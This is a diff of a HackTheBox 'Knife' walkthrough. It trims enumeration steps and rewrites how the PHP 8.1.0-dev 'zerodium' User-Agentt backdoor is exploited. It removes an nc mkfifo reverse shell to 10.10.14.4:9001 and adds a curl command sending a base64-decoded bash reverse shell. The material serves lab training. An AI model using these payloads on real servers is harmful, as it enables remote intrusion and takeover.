@@ -217,84 +217,7 @@ Let's browse to `http://10.10.10.242/`.
 
 It's a website for a medical company. There's hardly more information.
 
-#### Site crawling
-
-Let's see if we can find any linked web pages or directories.
-
-```sh
-❯ katana -u "http://10.10.10.242/"
-```
-
-```
-<SNIP>
-http://10.10.10.242/
-```
-
-We only find the homepage.
-
-#### Directory fuzzing
-
-Let's see if this website hides unliked web pages and directories.
-
-```sh
-❯ ffuf -v -c -u "http://10.10.10.242/FUZZ" -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -mc "100-403,405-599" -e ".php"
-```
-
-```
-<SNIP>
-[Status: 200, Size: 5815, Words: 646, Lines: 221, Duration: 63ms]
-| URL | http://10.10.10.242/index.php
-    * FUZZ: index.php
-
-[Status: 200, Size: 5815, Words: 646, Lines: 221, Duration: 65ms]
-| URL | http://10.10.10.242/
-    * FUZZ: 
-
-[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 79ms]
-| URL | http://10.10.10.242/server-status
-    * FUZZ: server-status
-<SNIP>
-```
-
-It doesn't find any noteworthy web page or directory.
-
-#### Vhost fuzzing
-
-Let's try to fuzz for vhosts now.
-
-According to HTB's naming habits, the domain name for this website would be
-`knife.htb`. Therefore, I'll add it to my `/etc/hosts` file.
-
-```sh
-❯ echo "10.10.10.242 knife.htb" >> /etc/hosts
-```
-
-First, let's get the length of an invalid vhost.
-
-```sh
-❯ curl -k -s "http://knife.htb/" -H "Host: nonExitent.knife.htb" | wc -c
-```
-
-```
-5815
-```
-
-Let's filter the vhosts with length `5815` then:
-
-```sh
-❯ ffuf -v -c -u "http://knife.htb/" -H "Host: FUZZ.knife.htb" -w "/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt" -mc "100-403,405-599" -fs "5815"
-```
-
-```
-<SNIP>
-```
-
-Nothing!
-
 #### Known vulnerabilities
-
-We only have two pieces of information at this point: the server is Apache
-version `2.4.41`, and the technology in use is PHP version `8.1.0-dev`.
 
 If we search [ExploitDB](https://www.exploit-db.com/) for `Apache 2.4.41`, we
 find nothing. However, if we enter `PHP 8.1.0-dev`, we find
@@ -315,25 +238,25 @@ First, I'll setup a listener to receive the shell.
 ❯ rlwrap nc -lvnp "9001"
 ```
 
-Then, I'll choose the 'nc mkfifo' payload from
+Then, I'll choose the Base64 encoded version of the 'Bash -i' payload from
 [RevShells](https://www.revshells.com/) configured to obtain a `/bin/bash`
 shell.
+
+I'll save it as the `BASE64_REVSHELL_PAYLOAD` shell variable.
 
 According to the Python PoC we found, the `User-Agentt` value I should send to
 execute this command is:
 
 ```sh
-zerodium system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.4 9001 >/tmp/f');
+zerodium system('/bin/echo $BASE64_REVSHELL_PAYLOAD | /usr/bin/base64 -d | /bin/bash -i');
 ```
-
-I'll save it as the `COMMAND` shell variable.
 
 ### Exploitation
 
 Let's send a request with this header.
 
 ```sh
-❯ curl -s -o "/dev/null" -H "User-Agentt: $COMMAND" "http://10.10.10.242/"
+❯ curl -s -o "/dev/null" -H "User-Agentt: zerodium system('/bin/echo $BASE64_REVSHELL_PAYLOAD | /usr/bin/base64 -d | /bin/bash -i');" "http://10.10.10.242/"
 ```
 
 If we check our listener:
@@ -536,6 +459,8 @@ knife
 
 Yeah I know, very surprising.
 
+## System enumeration
+
 ### Flags
 
 If we check our home folder, we find the user flag.
@@ -593,7 +518,7 @@ I'll create one and add the corresponding public key to `authorized_keys`, and
 then I'll connect over SSH to Knife. This way, I'll have a much more stable
 shell.
 
-## Getting a lay of the land
+## System enumeration
 
 If we run `whoami`, we see that we're `root`!
 
